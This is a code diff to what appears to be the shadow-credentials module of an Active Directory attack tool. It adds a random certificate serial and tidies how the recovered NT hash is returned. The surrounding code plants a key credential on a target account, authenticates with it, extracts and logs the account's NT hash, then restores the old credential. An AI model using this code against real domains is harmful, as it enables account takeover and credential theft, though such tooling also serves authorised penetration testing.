@@ -2,6 +2,7 @@
 # Copyright (c) 2021 ly4k
 
 
+from random import getrandbits
 from typing import List, Tuple
 
 import ldap3
@@ -89,6 +90,9 @@ def generate_key_credential(target_dn: str, subject: str) -> Tuple[X509Certifica
         notBefore=(-40 * 365),
         notAfter=(40 * 365),
     )
+    # dsinternals leaves serial at 0; RFC 5280 requires positive.
+    cert.certificate.set_serial_number(getrandbits(64))
+    cert.certificate.sign(cert.key, "sha256")
     logging.info("Certificate generated")
 
     logging.info("Generating Key Credential")
@@ -183,7 +187,7 @@ def auto(conn, target):
 
     logging.info(f"Authenticating as {target} with the certificate")
     authenticate = Authenticate(username=target, domain=conn.domain, cert=cert, key=key)
-    authenticate.nthash = getNThash(authenticate, is_key_credential=True)
+    nt_hash = getNThash(authenticate, is_key_credential=True)
 
     logging.info(f"Restoring the old Key Credentials for {target}")
     result = set_key_credentials(conn, target_dn, saved_key_credential)
@@ -191,9 +195,12 @@ def auto(conn, target):
     if result is True:
         logging.info(f"Successfully restored the old Key Credentials for {target}")
 
-    logging.info(f"NT hash for {target}: {authenticate.nthash}")
+    if nt_hash is False:
+        return False
 
-    return authenticate.nthash
+    logging.info(f"NT hash for {target}: {nt_hash}")
+
+    return nt_hash
 
 def add(conn, target):
     """
